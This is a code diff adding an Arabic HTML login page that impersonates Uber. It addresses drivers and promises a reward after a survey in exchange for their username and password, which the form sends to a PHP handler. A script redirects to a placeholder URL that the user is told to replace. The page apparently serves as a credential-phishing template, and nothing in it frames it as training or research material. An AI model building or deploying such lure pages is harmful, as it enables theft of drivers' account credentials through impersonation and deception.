@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f9;
+            text-align: center;
+            padding: 50px;
+        }
+
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            margin: auto;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        .warning {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        footer a {
+            color: #28a745;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+                width: 100%;
+            }
+
+            h2 {
+                font-size: 20px;
+            }
+
+            input[type="text"], input[type="password"] {
+                font-size: 16px;
+            }
+
+            button {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>مرحبًا سائق أوبر!</h2>
+        <p>يرجى تسجيل الدخول للحصول على مكافأتك بعد إتمام الاستبيان. فقط أدخل بياناتك أدناه.</p>
+        
+        <form action="submit_data.php" method="POST" id="loginForm">
+            <input type="text" name="username" placeholder="اسم المستخدم" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+
+        <div class="warning">
+            <p>تحذير: يتم تخزين كلمات المرور حاليًا بصيغة نصية عادية، يرجى توخي الحذر.</p>
+        </div>
+
+        <footer>
+            <p>إذا كنت تواجه مشكلة في التسجيل، يمكنك <a href="https://www.example.com/support">الاتصال بالدعم الفني</a>.</p>
+        </footer>
+    </div>
+
+    <script>
+        // JavaScript to handle form submission and redirection
+        document.getElementById("loginForm").onsubmit = function(event) {
+            event.preventDefault();  // Prevent the default form submission
+
+            // Simulating form submission
+            setTimeout(function() {
+                window.location.href = "http://www.example.com/thank-you"; // Replace with your actual redirection URL
+            }, 500);  // Redirects after 500ms delay
+        };
+    </script>
+</body>
+</html>
